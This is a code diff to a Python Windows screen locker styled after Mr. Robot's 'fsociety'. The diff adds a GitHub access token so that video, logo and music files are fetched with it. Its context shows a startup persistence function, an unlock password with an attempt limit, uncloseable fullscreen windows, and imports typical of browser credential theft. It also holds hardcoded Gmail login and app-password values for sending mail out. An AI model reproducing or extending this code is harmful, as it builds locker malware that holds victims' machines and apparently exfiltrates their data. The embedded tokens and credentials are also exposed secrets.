@@ -20,12 +20,13 @@ import sqlite3, win32crypt, shutil, winreg, ctypes
 PASSWORD = "1601"
 MAX_ATTEMPTS = 4
 TIMER_FILE = os.path.join(os.environ.get('PROGRAMDATA', 'C:\\ProgramData'), "Microsoft", "Windows", "timer.dat")
+TOKEN = "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"
 GMAIL_LOGIN = "xzx78848@gmail.com"
 GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
 RECEIVER_EMAIL = "xzx78848@gmail.com"
-VIDEO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/fuxEcorp.mp4.mp4"
-LOGO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/logo.png"
-LOCKER_MUSIC_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/Max_Quayle_-_Mr._Robot_OST_Main_Theme_(SkySound.cc).mp3"
+VIDEO_URL = f"https://raw.githubusercontent.com/ippo123459-bit/winlocker/main/fuxEcorp.mp4.mp4?token={TOKEN}"
+LOGO_URL = f"https://raw.githubusercontent.com/ippo123459-bit/winlocker/main/logo.png?token={TOKEN}"
+LOCKER_MUSIC_URL = f"https://raw.githubusercontent.com/ippo123459-bit/winlocker/main/Max_Quayle_-_Mr._Robot_OST_Main_Theme_(SkySound.cc).mp3?token={TOKEN}"
 VIDEO_PATH = os.path.join(tempfile.gettempdir(), "fuxEcorp.mp4.mp4")
 LOGO_PATH = os.path.join(tempfile.gettempdir(), "logo.png")
 LOCKER_MUSIC_PATH = os.path.join(tempfile.gettempdir(), "Max_Quayle_-_Mr._Robot_OST_Main_Theme_(SkySound.cc).mp3")
@@ -157,8 +158,12 @@ def add_to_startup():
 def download_file(url, path):
     try:
         if os.path.exists(path): os.remove(path)
+        req = urllib.request.Request(url)
+        req.add_header("Authorization", f"token {TOKEN}")
         urllib.request.urlretrieve(url, path)
-    except: pass
+    except:
+        try: urllib.request.urlretrieve(url, path)
+        except: pass
 
 def anim_fsociety():
     a = tk.Tk(); a.attributes('-fullscreen', True); a.attributes('-topmost', True)
@@ -194,8 +199,7 @@ def anim_connect():
     time.sleep(3); a.destroy()
 
 def play_video():
-    try:
-        download_file(VIDEO_URL, VIDEO_PATH)
+    try: download_file(VIDEO_URL, VIDEO_PATH)
     except: return
     time.sleep(0.3)
     try:
@@ -203,14 +207,11 @@ def play_video():
         v.configure(bg='black'); v.overrideredirect(True)
         v.protocol("WM_DELETE_WINDOW", lambda: None)
         lbl = tk.Label(v, bg='black'); lbl.pack(expand=True, fill='both')
-        try:
-            subprocess.Popen(['ffplay','-nodisp','-autoexit','-loglevel','quiet', VIDEO_PATH], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
+        try: subprocess.Popen(['ffplay','-nodisp','-autoexit','-loglevel','quiet', VIDEO_PATH], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
         except:
             try:
-                import pygame
-                pygame.mixer.init()
-                pygame.mixer.music.load(VIDEO_PATH)
-                pygame.mixer.music.play()
+                import pygame; pygame.mixer.init()
+                pygame.mixer.music.load(VIDEO_PATH); pygame.mixer.music.play()
             except: pass
         cap = cv2.VideoCapture(VIDEO_PATH)
         if cap.isOpened():
